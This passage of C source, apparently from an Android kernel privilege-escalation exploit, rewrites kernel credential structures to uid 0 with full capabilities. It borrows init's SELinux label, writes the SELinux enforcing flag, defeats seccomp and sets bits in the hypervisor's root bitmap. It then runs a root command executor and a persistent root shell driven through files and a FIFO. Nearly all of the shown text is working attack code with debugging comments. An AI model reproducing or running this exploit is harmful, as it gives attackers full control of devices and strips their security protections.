        int idok = root_read_data(fd, ids_addr, saved_ids, sizeof(saved_ids));
        for (int k = 0; k < 8; k += 2) {
          app_ids[k] = auid;
          app_ids[k + 1] = agid;
        }
        int idwr =
            pipe_phys_write_data(fd, ids_addr, app_ids, sizeof(app_ids));
        target_cred_osid = bosid;
        target_cred_sid = bsid;
        int s1 = patch_cred_sid(fd, current_cred_addr);
        int s2 = -1;
        if (current_real_cred_addr != current_cred_addr) {
          s2 = patch_cred_sid(fd, current_real_cred_addr);
        }
        /* Read our own SID back: this separates "the write did not take" from
         * "SELinux still denies with the borrowed identity". */
        uint32_t nvsid = 0;
        uint64_t nsec = pipe_read64(fd, current_cred_addr + CRED_SECURITY_OFF);
        if (is_direct_ptr(nsec)) {
          nvsid = root_read32(
              fd, nsec + SELINUX_CRED_BLOB_OFF + SELINUX_CRED_SID_OFF);
        }
        char path[96];
        snprintf(path, sizeof(path), "/data/data/%s", app);
        int tfd = open(path, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        int terr = errno;
        /*
         * /data/data/<pkg> is a legacy symlink whose parent is system_data_file,
         * which app domains are typically not granted search on -- they reach
         * their own data through /data/user/0/<pkg>.  Test both, so a failure on
         * the first path does not hide success on the real one.
         */
        snprintf(path, sizeof(path), "/data/user/0/%s", app);
        int ufd = open(path, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        int uerr = errno;
        pr_info("borrow-open %s fd=%d errno=%d uid=%u idok=%d idwr=%d "
                "sid=%u now=%u s1=%d s2=%d | user0 fd=%d errno=%d\n",
                app, tfd, terr, auid, idok, idwr, bsid, nvsid, s1, s2, ufd, uerr);
        if (ufd >= 0) {
          close(ufd);
        }
        if (tfd >= 0) {
          close(tfd);
        }
        /* Restore our own identity so the rest of the flow keeps working. */
        if (idok) {
          pipe_phys_write_data(fd, ids_addr, saved_ids, sizeof(saved_ids));
        }
        target_cred_osid = sosid;
        target_cred_sid = ssid;
        patch_cred_sid(fd, current_cred_addr);
        if (current_real_cred_addr != current_cred_addr) {
          patch_cred_sid(fd, current_real_cred_addr);
        }
      }
    }
  }
#endif /* route ②, disabled -- see the note above */

  /*
   * Init-domain probe -- Mate60 chain L5, with two corrections.
   *
   * Their L5 sets cred->security->sid = u:r:init:s0 and calls the domain
   * switch a hard prerequisite.  The idea transfers, the constant does not:
   *
   *  - Android's initial SID "init" is u:object_r:unlabeled:s0 (sid 7 of
   *    sidorder), NOT u:r:init:s0, and non-initial SIDs are allocated at
   *    runtime (our own shell SID is ~2000), so the only reliable source
   *    for the init *domain* SID is pid 1's own cred.
   *  - init is not an app-data key.  Every s0 domain (shell/system/init)
   *    still fails the MLS constraint `(dom l1 l2)` against app data at
   *    s0:c512,c768.  What init buys is the Magisk surface: rootfs:dir has
   *    mounton/create/write, system_file:dir has mounton, shell_exec:file
   *    has execute -- while kernel(1) has none of these.
   *
   * uid stays 0 so the /data/adb owner check passes on DAC without
   * CAP_DAC_OVERRIDE (which HKIP blocks even for pid 0).  The probe does
   * no execve, because exec re-derives the SID from the policy and would
   * measure nothing.  The original identity is restored before returning,
   * and this runs before collect_root_child(), so the still-forked child
   * never opens the HKIP gate while the borrowed SID is installed.
   */
  /*
   * L5: borrow pid 1's SELinux label.  The label is the cred blob at
   * cred->security + selinux_blob_sizes.lbs_cred, so copying the 24-byte
   * task_security_struct into OUR blob changes the domain without ever
   * pointing two creds at one blob (a pointer swap would let
   * selinux_cred_free() kfree pid 1's live blob).
   *
   * It has to run here, never before the pipe stage: configfs oopses on
   * linear-map addresses and the task list lives there (STATE addendum 5-2).
   */
  {
    uint32_t off = selinux_cred_blob_off;
    uintptr_t p1 = find_task_by_tgid(fd, 1);
    uint64_t p1c = is_direct_ptr(p1) ? root_read64(fd, p1 + TASK_CRED_OFF) : 0;
    uint64_t p1s =
        is_direct_ptr(p1c) ? root_read64(fd, p1c + CRED_SECURITY_OFF) : 0;
    uint32_t tsec[6] = {0};
    int got = 0;
    int put = 0;
    uint32_t after = 0xffffffff;
    if (is_direct_ptr(p1s) && is_direct_ptr(current_cred_security_addr) &&
        pipe_phys_read_data(fd, p1s + off, tsec, sizeof(tsec))) {
      got = 1;
      put = pipe_phys_write_data(
                fd, current_cred_security_addr + off, tsec, sizeof(tsec))
                ? 1
                : 0;
      if (current_real_cred_addr != current_cred_addr &&
          is_direct_ptr(current_real_cred_security_addr)) {
        pipe_phys_write_data(
            fd, current_real_cred_security_addr + off, tsec, sizeof(tsec));
      }
      after = pipe_read32(
          fd, current_cred_security_addr + off + SELINUX_CRED_SID_OFF);
    }
    pr_info("l5 off=%u p1t=%016llx p1s=%016llx got=%d put=%d osid=%u sid=%u "
            "rb=%u\n",
            off, (unsigned long long)p1, (unsigned long long)p1s, got, put,
            tsec[0], tsec[1], after);
  }

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }

  uint32_t cred_uid_after = root_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    root_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  root_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  root_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = root_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = root_read32(fd, sid_addr);
  }
  uint32_t cred_gid_after =
    root_read32(fd, current_cred_addr + CRED_UID_OFF + 4);
  uint32_t real_gid_after =
    root_read32(fd, current_real_cred_addr + CRED_UID_OFF + 4);
  pr_info("root cred patched uid=%u/%u gid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_gid_after, real_gid_after, cred_sid_after,
          real_cred_sid_after);
  /* Trimmed 2026-11-12 to pay for the module-load probe: only the after values
   * are printed, and the before values are folded into one comparison.  caps
   * have been proven full on every landing so far. */
  pr_info("root caps eff=%016llx prm=%016llx amb=%016llx bset=%016llx reff=%016llx was=%016llx\n",
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE]);

  /*
   * SELinux relax (data-only, dawnslab route): policy fields are written
   * directly at their vmalloc addresses (configfs allows non-linear; only
   * kernel text/rodata is rejected).  Runs before the teardown below, the
   * same ordering as upstream oriole exploit.c:3367.
   */

#ifdef TASK_HKIP_XID_OFF
  /* Bitmap is HKIP-RO.  Keep pid=0 only around uid-0 execve. */
#endif

  pr_info("root collect child pid=%d\n", root_child_pid);
  capable_head_before = root_read64(fd, capable_head);
  /*
   * Judge BEFORE the child is released.  The cred patch is already in place, so
   * the child's label is final here, and nothing the child does can destroy the
   * measurement.  Both i18 and j44 lost exactly this line because it used to sit
   * after collect_root_child() -- i.e. after go=1 -- and the probe crash is
   * faster than the following print.
   */
  /*
   * Durable copy of the measurement.  Three landings lost their data because
   * the adb stream was truncated by the crash, so every line below is also
   * appended to a file on the device: /data/local/tmp survives the reboot and
   * the shell domain can read it back afterwards.
   */
  char lb[64];
  int lfd = open("/data/local/tmp/l5r.log",
                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
  {
    char pth[48];
    char cb[80] = {0};
    snprintf(pth, sizeof(pth), "/proc/%d/attr/current", (int)root_child_pid);
    int pf = open(pth, O_RDONLY | O_CLOEXEC);
    int pn = pf < 0 ? -errno : (int)read(pf, cb, sizeof(cb) - 1);
    if (pf >= 0) {
      close(pf);
    }
    if (pn > 0) {
      cb[pn] = '\0';
    }
    pr_info("l5 pre n=%d ctx='%s'\n", pn, cb);
    int ln = snprintf(lb, sizeof(lb), "pre n=%d ctx=%s\n", pn, cb);
    if (lfd >= 0 && ln > 0) {
      (void)write(lfd, lb, (size_t)ln);
    }
  }
  /*
   * Release the child here (collect_root_child sets go again, harmlessly) and
   * watch the mount probe live.  The probe sleeps 300 ms before each call, so
   * the stage printed here always names the call about to run; after a crash the
   * last stage printed is the fatal one.
   */
  atomic_store(&root_shared->go, 1);
  root_child_done = collect_root_child();
  /*
   * Service the window the child is now blocked in.  collect_root_child returns
   * as soon as done=1 and the child's very next step is hkip_exec_window(); if
   * nothing services it here the child waits the full 8 s and _exit(3)s, so this
   * must come before the stage watch.
   */
  {
    /* These must land in the globals: the restore further down is driven by
     * sticky_task_addr/sticky_pid1/sticky_pid2.  Writing them into locals made
     * that restore a silent no-op, because the globals were never assigned. */
    (void)hkip_zero_pid_for_seq(
        fd, 1, &sticky_task_addr, &sticky_pid1, &sticky_pid2);
  }
  {
    volatile int *rp = (volatile int *)((char *)root_shared + 512);
    int cur = 0;
    for (int i = 0; i < 120; i++) {
      cur = rp[0];
      if (cur >= 12) {
        break;
      }
      usleep(50000);
    }
    /*
     * Dump EVERY record that was written, not just the newest: the child can
     * outrun a 50 ms poll, and the p1 landing was lost to exactly that (only
     * rec=6 got printed).  A record exists iff its id slot holds its index.
     */
    /*
     * E2E round trip.  /sdcard is the only path both the manager app
     * (untrusted_app, writes) and this shell-domain half can touch, so:
     *   1. publish session state  -> the app shows 工作中
     *   2. echo the queued request -> proves app -> daemon reaches us
     * The init half is not needed for either direction; it already reported via
     * the gate page above.
     */
    {
      char jctx[64] = "unknown";
      char pth[48];
      snprintf(pth, sizeof(pth), "/proc/%d/attr/current", (int)root_child_pid);
      int jf = open(pth, O_RDONLY | O_CLOEXEC);
      if (jf >= 0) {
        int jn = (int)read(jf, jctx, sizeof(jctx) - 1);
        close(jf);
        if (jn > 0) {
          jctx[jn] = '\0';
          for (int k = 0; k < jn; k++) {
            if (jctx[k] == '\n') {
              jctx[k] = '\0';
            }
          }
        }
      }
      char sb[176];
      int sn = snprintf(sb, sizeof(sb),
                        "session=up\ndomain=%s\nuid=%u\nmanager=0.1\n"
                        "kernel=5.10.43\n", jctx, (unsigned)getuid());
      int sf = open("/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                    O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
      if (sf >= 0) {
        if (sn > 0) {
                (void)write(sf, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
        close(sf);
        pr_info("e2e status written domain=%s\n", jctx);
      } else {
        pr_info("e2e status open failed errno=%d\n", errno);
      }
      char last[192];
      memset(last, 0, sizeof(last));
      if (getenv("CVE43499_LEAN") && sticky_task_addr) {
        hkip_restore_pid(fd, 1, sticky_task_addr, sticky_pid1, sticky_pid2);
      }
      /*
       * Capture OUR OWN task while the task-list walk is known good (the landing
       * just used it for ll_root_child).  g77 showed the same walk can come back
       * empty later, inside this request loop, and that is what made selfroot
       * patch the wrong cred.  From here on selfroot does not rely on a walk.
       */
      self_task_addr = find_task_by_tgid(fd, (uint32_t)getpid());
      pr_info("self task=%016llx iters=%d last_tgid=%u\n",
              (unsigned long long)self_task_addr, task_walk_iters,
              task_walk_last_tgid);
      for (;;) {
      int rf = open("/sdcard/Android/data/com.l5.root/files/l5/req.txt", O_RDONLY | O_CLOEXEC);
      if (rf >= 0) {
        char rb[192];
        int rn = (int)read(rf, rb, sizeof(rb) - 1);
        close(rf);
        if (rn > 0) {
          rb[rn] = '\0';
          if (strcmp(rb, last) != 0) {
          memcpy(last, rb, (size_t)(rn + 1));
          pr_info("e2e req=%s\n", rb);
          /*
           * Grant test: "grant <tgid>" patches THAT task's cred identity
           * (uid 0 + full caps) and leaves its SELinux sid alone, which is
           * what a KSU-style grant does.  This is the first write to a
           * foreign task's cred, so the question being measured is whether
           * HKIP tolerates it or panics.
           */
          if (rn > 8 && !strncmp(rb, "enforce ", 8)) {
            /*
             * The pselect path has only ever ASSIGNED selinux_after = 0
             * (root.c:992); it never wrote the kernel byte.  So "SELinux is
             * off" was never actually tested.  Write selinux_state.enforcing
             * for real and read it back, so the host can compare with
             * getenforce instead of trusting an assignment.
             */
            uintptr_t se = text_addr(SELINUX_ENFORCING);
            uint8_t sb = 0xff, sa = 0xff;
            uint8_t want = (rb[8] == '0') ? 0 : 1;
            (void)root_read_data(fd, se, &sb, 1);
            int w = root_write_data(fd, se, &want, 1);
            (void)root_read_data(fd, se, &sa, 1);
            pr_info("enforce addr=%016llx %u->%u w=%d after=%u\n",
                    (unsigned long long)se, sb, want, w, sa);
          }
          if (rn >= 8 && !strncmp(rb, "selfroot", 8)) {
            /*
             * The whole point of this verb: the gate gives ITSELF uid 0 and
             * never forks.  hvc_grant_uid_root() (fops.c:1425) has always been
             * able to register the calling thread in the EL2 bitmap, and
             * hvc_grant_uid_bit() takes an arbitrary tid, so the forked uid-0
             * child that "rootexec" used -- which needed a SECOND injection in
             * the same boot, and injections are single-shot -- can be dropped.
             *
             * HKIP validates the CURRENT thread's tid (task+0x640), so every
             * thread of this process needs its bit set before the cred rewrite.
             * One ROWM_WRITE_8 sets one byte = 8 consecutive tids, so tid
             * numbers are collapsed to byte indexes first and only 1 injection
             * per distinct byte is attempted; each thread's bit is then verified
             * by reading the bitmap back, and the cred is only touched when
             * every thread of this process is actually covered.
             */
            int lfs = open("/data/local/tmp/l5r.log",
                           O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
            char lbs[224];
            uint32_t tids[16];
            int nt = 0;
            /* cmd/out MUST be opened before the cred patch: once this process is
             * uid 0, sdcardfs (FUSE, uid-scoped) refuses to open anything under
             * /sdcard, so the request channel goes deaf at that instant. */
            int fc = open(
                "/sdcard/Android/data/com.l5.root/files/l5/cmd.txt",
                O_RDONLY | O_CLOEXEC);
            int fo = open(
                "/sdcard/Android/data/com.l5.root/files/l5/out.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            char cmdb[160];
            int cn2 = 0;
            cmdb[0] = 0;
            if (fc >= 0) {
              cn2 = (int)read(fc, cmdb, sizeof(cmdb) - 1);
              if (cn2 > 0) {
                cmdb[cn2] = 0;
              } else {
                cn2 = 0;
              }
            }
            DIR* dt = opendir("/proc/self/task");
            if (dt) {
              struct dirent* de;
              while ((de = readdir(dt)) != NULL && nt < 16) {
                const char* qq = de->d_name;
                if (*qq < '0' || *qq > '9') {
                  continue;
                }
                uint32_t v = 0;
                for (; *qq >= '0' && *qq <= '9'; qq++) {
                  v = v * 10u + (uint32_t)(*qq - '0');
                }
                tids[nt++] = v;
              }
              closedir(dt);
            }
            uintptr_t bmap = text_addr(HKIP_UID_ROOT_BITS);
            uint64_t bytes[8];
            int nb = 0;
            for (int i = 0; i < nt; i++) {
              uint64_t b = (uint64_t)(tids[i] >> 3);
              int dup = 0;
              for (int k = 0; k < nb; k++) {
                if (bytes[k] == b) {
                  dup = 1;
                }
              }
              if (!dup && nb < 8) {
                bytes[nb++] = b;
              }
            }
            int inj_ok = 0;
            for (int k = 0; k < nb && inj_ok < 1; k++) {
              /* single-shot: only the first byte is likely to take */
              inj_ok += hvc_grant_uid_bit(fd, (unsigned long)tids[0]);
            }
            int covered = 1;
            for (int i = 0; i < nt; i++) {
              uint8_t v = 0;
              uint64_t b = (uint64_t)(tids[i] >> 3);
              if (kernel_read_data(fd, bmap + (uintptr_t)b, &v, 1) != 1) {
                covered = 0;
                continue;
              }
              if ((v & (uint8_t)(1u << (tids[i] & 7u))) == 0) {
                covered = 0;
              }
            }
            /*
             * g76 measured the trap: patching the CACHED cred pointers left the
             * forked child at uid 2000 even though the readback said 0, i.e. the
             * object written was not the live cred of the thread that forks.
             * Resolve THIS thread's task by tid and take cred/real_cred straight
             * from it; the cached pointers remain only as a fallback.
             */
            uint32_t me_tid = (uint32_t)syscall(SYS_gettid);
            /* Prefer the task captured at landing; only then walk, then match comm. */
            uint64_t tself = is_direct_ptr(self_task_addr)
                                 ? self_task_addr
                                 : find_task_by_tgid(fd, me_tid);
            int w1_iters = task_walk_iters;
            uint32_t w1_last = task_walk_last_tgid;
            uint64_t tself2 = 0;
            int w2_iters = 0;
            if (!is_direct_ptr(tself)) {
              tself2 = find_task_by_tgid(fd, (uint32_t)getpid());
              w2_iters = task_walk_iters;
              if (is_direct_ptr(tself2)) {
                tself = tself2;
              }
            }
            if (lfs >= 0) {
              int n5 = snprintf(
                  lbs, sizeof(lbs),
                  "selfroot walk tid=%u it1=%d last1=%u tself2=%016llx it2=%d "
                  "cc=%016llx ct=%016llx\n",
                  me_tid, w1_iters, w1_last, (unsigned long long)tself2, w2_iters,
                  (unsigned long long)current_cred_addr,
                  (unsigned long long)current_task_addr);
              if (n5 > 0) {
                (void)write(lfs, lbs, (size_t)n5);
                (void)fsync(lfs);
              }
            }
            if (!is_direct_ptr(tself)) {
              char selfname[17];
              memset(selfname, 0, sizeof(selfname));
              (void)prctl(PR_GET_NAME, (unsigned long)selfname, 0, 0, 0);
              tself2 = find_task_by_comm(fd, selfname);
              if (is_direct_ptr(tself2)) {
                tself = tself2;
              }
            }
            uint64_t cself =
                is_direct_ptr(tself) ? root_read64(fd, tself + TASK_CRED_OFF) : 0;
            uint64_t rself = is_direct_ptr(tself)
                                 ? root_read64(fd, tself + TASK_REAL_CRED_OFF)
                                 : 0;
            int pok = 0;
            if (covered) {
              if (is_direct_ptr(cself)) {
                pok = patch_cred_identity(fd, cself);
                if (is_direct_ptr(rself) && rself != cself) {
                  pok = patch_cred_identity(fd, rself) && pok;
                }
              } else {
                pok = patch_cred_identity(fd, current_cred_addr);
                if (current_real_cred_addr != current_cred_addr) {
                  pok = patch_cred_identity(fd, current_real_cred_addr) && pok;
                }
              }
            }
            uint32_t self_uid = 0xffffffffu;
            if (is_direct_ptr(cself)) {
              self_uid = root_read32(fd, cself + CRED_UID_OFF);
            } else if (is_direct_ptr(current_cred_addr)) {
              self_uid = root_read32(fd, current_cred_addr + CRED_UID_OFF);
            }
            if (lfs >= 0) {
              int n6 = snprintf(lbs, sizeof(lbs),
                                "selfroot cred self=%016llx cself=%016llx "
                                "rself=%016llx uid=%u pok=%d\n",
                                (unsigned long long)tself,
                                (unsigned long long)cself,
                                (unsigned long long)rself, self_uid, pok);
              if (n6 > 0) {
                (void)write(lfs, lbs, (size_t)n6);
                (void)fsync(lfs);
              }
            }
            if (pok && self_uid == 0) {
              gate_selfrooted = 1;
            }
            /* In-process, no fork: prove the new identity does work. */
            int wok = 0;
            if (gate_selfrooted) {
              errno = 0;
              int wf = open("/data/local/tmp/l5_selfroot.txt",
                            O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
              if (wf >= 0) {
                wok = write(wf, "selfroot\n", 9) == 9;
                close(wf);
              }
            }
            /* Fork the executor only AFTER the cred patch: the parent is
             * registered, so copy_process passes, and the child's tid normally
             * lands inside a 0xff byte this process already wrote.  The bit is
             * read back before the child is released. */
            int ch = 0;
            int bit2 = 0;
            if (gate_selfrooted) {
              int rp[2] = {-1, -1};
              (void)pipe(rp);
              ch = (int)fork();
              if (ch == 0) {
                if (rp[0] >= 0) {
                  char one = 0;
                  (void)read(rp[0], &one, 1);
                }
                if (fo >= 0) {
                  (void)dup2(fo, 1);
                  (void)dup2(fo, 2);
                }
                execl("/system/bin/sh", "sh", "-c", cn2 > 0 ? cmdb : "id",
                      (char*)0);
                _exit(127);
              }
              if (ch > 0) {
                usleep(120000);
                uintptr_t bm3 = text_addr(HKIP_UID_ROOT_BITS);
                uint64_t bb3 = (uint64_t)((uint32_t)ch >> 3);
                uint8_t bv3 = 0;
                int okr3 = kernel_read_data(fd, bm3 + (uintptr_t)bb3, &bv3, 1) == 1;
                bit2 = okr3 && (bv3 & (uint8_t)(1u << ((uint32_t)ch & 7u))) != 0;
                if (!bit2) {
                  (void)hvc_grant_uid_bit(fd, (unsigned long)(uint32_t)ch);
                  bv3 = 0;
                  okr3 = kernel_read_data(fd, bm3 + (uintptr_t)bb3, &bv3, 1) == 1;
                  bit2 = okr3 && (bv3 & (uint8_t)(1u << ((uint32_t)ch & 7u))) != 0;
                }
                if (bit2) {
                  if (rp[1] >= 0) {
                    (void)write(rp[1], "1", 1);
                  }
                } else {
                  (void)kill(ch, 9);
                }
              }
              if (rp[0] >= 0) {
                close(rp[0]);
              }
              if (rp[1] >= 0) {
                close(rp[1]);
              }
            }
            if (fc >= 0) {
              close(fc);
            }
            if (fo >= 0) {
              close(fo);
            }
            if (lfs >= 0) {
              int n4 = snprintf(lbs, sizeof(lbs),
                                "selfexec child=%d bit=%d cmd=%s\n", ch, bit2,
                                cmdb);
              if (n4 > 0) {
                (void)write(lfs, lbs, (size_t)n4);
                (void)fsync(lfs);
              }
            }
            if (lfs >= 0) {
              int n3 = snprintf(
                  lbs, sizeof(lbs),
                  "selfroot nt=%d nb=%d inj=%d covered=%d patch=%d uid=%u "
                  "write=%d real=%016llx\n",
                  nt, nb, inj_ok, covered, pok, self_uid, wok,
                  (unsigned long long)cself);
              if (n3 > 0) {
                (void)write(lfs, lbs,
                            (size_t)(n3 < (int)sizeof(lbs) ? n3
                                                          : (int)sizeof(lbs) - 1));
                (void)fsync(lfs);
              }
              close(lfs);
            }
            pr_info("selfroot nt=%d nb=%d inj=%d covered=%d patch=%d uid=%u "
                    "write=%d\n",
                    nt, nb, inj_ok, covered, pok, self_uid, wok);
            sn = snprintf(sb, sizeof(sb),
                          "session=up\nselfroot=1\ntids=%d\nbytes=%d\ninj=%d\n"
                          "covered=%d\npatch=%d\nuid=%u\nwrite=%d\n",
                          nt, nb, inj_ok, covered, pok, self_uid, wok);
            int fgs = open(
                "/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (fgs >= 0) {
              if (sn > 0) {
                (void)write(fgs, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              close(fgs);
            }
          }
          if (rn >= 9 && !strncmp(rb, "rootexec2", 9)) {
            /* Fork-only root executor.  The gate is already uid 0 and each
             * ROWM_WRITE_8 set a WHOLE byte (0xff = 8 consecutive tids), so a
             * freshly forked child is usually already registered.  The child's
             * bit is read back from the bitmap BEFORE it is released: if it is
             * missing we try exactly one injection, and if that fails the child
             * is killed rather than allowed to become an unregistered uid-0 task
             * (that is what reset the device in g2/g3). */
            if (!gate_selfrooted) {
              sn = snprintf(sb, sizeof(sb),
                            "session=up\nrootexec2=0\nerr=not-selfrooted\n");
            } else {
              int fc = open(
                  "/sdcard/Android/data/com.l5.root/files/l5/cmd.txt",
                  O_RDONLY | O_CLOEXEC);
              int fo = open(
                  "/sdcard/Android/data/com.l5.root/files/l5/out.txt",
                  O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
              char cmdb[160];
              int cn2 = 0;
              cmdb[0] = 0;
              if (fc >= 0) {
                cn2 = (int)read(fc, cmdb, sizeof(cmdb) - 1);
                if (cn2 > 0) {
                  cmdb[cn2] = 0;
                } else {
                  cn2 = 0;
                }
              }
              int rp[2] = {-1, -1};
              (void)pipe(rp);
              pid_t ch = fork();
              if (ch == 0) {
                if (rp[0] >= 0) {
                  char one = 0;
                  (void)read(rp[0], &one, 1);
                }
                if (fo >= 0) {
                  (void)dup2(fo, 1);
                  (void)dup2(fo, 2);
                }
                execl("/system/bin/sh", "sh", "-c", cn2 > 0 ? cmdb : "id",
                      (char*)0);
                _exit(127);
              }
              int bit2 = 0;
              if (ch > 0) {
                usleep(120000);
                uintptr_t bm2 = text_addr(HKIP_UID_ROOT_BITS);
                uint64_t bb = (uint64_t)((uint32_t)ch >> 3);
                uint8_t bv = 0;
                int okr = kernel_read_data(fd, bm2 + (uintptr_t)bb, &bv, 1) == 1;
                bit2 = okr && (bv & (uint8_t)(1u << ((uint32_t)ch & 7u))) != 0;
                if (!bit2) {
                  (void)hvc_grant_uid_bit(fd, (unsigned long)(uint32_t)ch);
                  bv = 0;
                  okr = kernel_read_data(fd, bm2 + (uintptr_t)bb, &bv, 1) == 1;
                  bit2 = okr && (bv & (uint8_t)(1u << ((uint32_t)ch & 7u))) != 0;
                }
                if (bit2) {
                  if (rp[1] >= 0) {
                    (void)write(rp[1], "1", 1);
                  }
                } else {
                  (void)kill(ch, 9);
                }
              }
              if (rp[0] >= 0) {
                close(rp[0]);
              }
              if (rp[1] >= 0) {
                close(rp[1]);
              }
              if (fc >= 0) {
                close(fc);
              }
              if (fo >= 0) {
                close(fo);
              }
              pr_info("rootexec2 child=%d bit=%d cmd=%s\n", (int)ch, bit2, cmdb);
              sn = snprintf(sb, sizeof(sb),
                            "session=up\nrootexec2=1\nchild=%d\nbit=%d\ncmd=%s\n",
                            (int)ch, bit2, cmdb);
            }
            int fg7 = open(
                "/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (fg7 >= 0) {
              if (sn > 0) {
                (void)write(fg7, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              close(fg7);
            }
          }
          if (rn >= 5 && !strncmp(rb, "shnew", 5)) {
            /*
             * Start ONE persistent root shell so commands keep their context
             * (cwd, exported vars, background jobs).  srvroot forks a fresh
             * `sh -c` per request and therefore has no state; this is the fix.
             *
             * The shell reads commands from a FIFO the gate keeps open O_RDWR
             * (that both avoids a writer/reader open race and stops the shell
             * from seeing EOF), and writes everything to a session log which
             * `shout <offset>` reads back.
             */
            const char* FIFO = "/data/local/tmp/.l5sh.fifo";
            const char* SLOG = "/data/local/tmp/.l5sh.log";
            (void)unlink(FIFO);
            (void)unlink(SLOG);
            int mk = mkfifo(FIFO, 0666);
            int out = open(SLOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            int rw = open(FIFO, O_RDWR | O_CLOEXEC);
            int cp[2] = {-1, -1};
            int rp[2] = {-1, -1};
            int ch = 0, bok = 0, pok = 0;
            if (mk == 0 && out >= 0 && rw >= 0 && pipe(cp) == 0 && pipe(rp) == 0) {
              ch = (int)fork();
              if (ch == 0) {
                (void)prctl(PR_SET_NAME, (unsigned long)"l5sh", 0, 0, 0);
                if (cp[1] >= 0) {
                  (void)write(cp[1], "1", 1);
                }
                if (rp[0] >= 0) {
                  char one = 0;
                  (void)read(rp[0], &one, 1);
                }
                (void)dup2(rw, 0);
                (void)dup2(out, 1);
                (void)dup2(out, 2);
                execl("/system/bin/sh", "sh", (char*)0);
                _exit(127);
              }
              if (ch > 0) {
                if (cp[0] >= 0) {
                  char one = 0;
                  (void)read(cp[0], &one, 1);
                }
                uint64_t t = find_task_by_comm(fd, "l5sh");
                int bit = 0;
                if (is_direct_ptr(t)) {
                  uintptr_t bm = text_addr(HKIP_UID_ROOT_BITS);
                  uint32_t id = (uint32_t)ch; /* fork() returns the child tid */
                  uint64_t bb = (uint64_t)(id >> 3);
                  uint8_t bv = 0;
                  bit = kernel_read_data(fd, bm + (uintptr_t)bb, &bv, 1) == 1 &&
                        (bv & (uint8_t)(1u << (id & 7u))) != 0;
                  if (!bit) {
                    (void)hvc_grant_uid_bit(fd, (unsigned long)id);
                    bv = 0;
                    bit = kernel_read_data(fd, bm + (uintptr_t)bb, &bv, 1) == 1 &&
                          (bv & (uint8_t)(1u << (id & 7u))) != 0;
                  }
                  uint64_t cr = root_read64(fd, t + TASK_CRED_OFF);
                  if (bit && is_direct_ptr(cr)) {
                    pok = patch_cred_identity(fd, cr);
                  }
                  bok = bit;
                }
                if (bok && pok) {
                  if (rp[1] >= 0) {
                    (void)write(rp[1], "1", 1);
                  }
                  if (g_shfd >= 0) {
                    close(g_shfd);
                  }
                  g_shfd = rw;
                  g_shpid = (uint32_t)ch;
                  rw = -1;
                } else {
                  (void)kill(ch, 9);
                }
              }
            }
            if (cp[0] >= 0) close(cp[0]);
            if (cp[1] >= 0) close(cp[1]);
            if (rp[0] >= 0) close(rp[0]);
            if (rp[1] >= 0) close(rp[1]);
            if (rw >= 0) close(rw);
            if (out >= 0) close(out);
            pr_info("shnew fifo=%d out=%d child=%d bit=%d patch=%d\n", mk, out >= 0 ? 1 : 0,
                    ch, bok, pok);
            sn = snprintf(sb, sizeof(sb),
                          "session=up\nshnew=1\nchild=%d\nbit=%d\npatch=%d\n", ch, bok,
                          pok);
            int fgs = open(
                "/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (fgs >= 0) {
              if (sn > 0) {
                (void)write(fgs, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              close(fgs);
            }
          }
          if (rn >= 6 && !strncmp(rb, "shsend", 6)) {
            const char* q = rb + 6;
            while (*q == ' ') {
              q++;
            }
            int wr = -1;
            if (g_shfd >= 0 && *q) {
              char line[192];
              int n = snprintf(line, sizeof(line), "%s\n", q);
              if (n > 0) {
                wr = (int)write(g_shfd, line, (size_t)n);
                (void)fsync(g_shfd);
              }
            }
            pr_info("shsend ok=%d cmd=%s\n", wr, q);
          }
          if (rn >= 5 && !strncmp(rb, "shout", 5)) {
            unsigned long off = 0;
            const char* q = rb + 5;
            while (*q == ' ') {
              q++;
            }
            while (*q >= '0' && *q <= '9') {
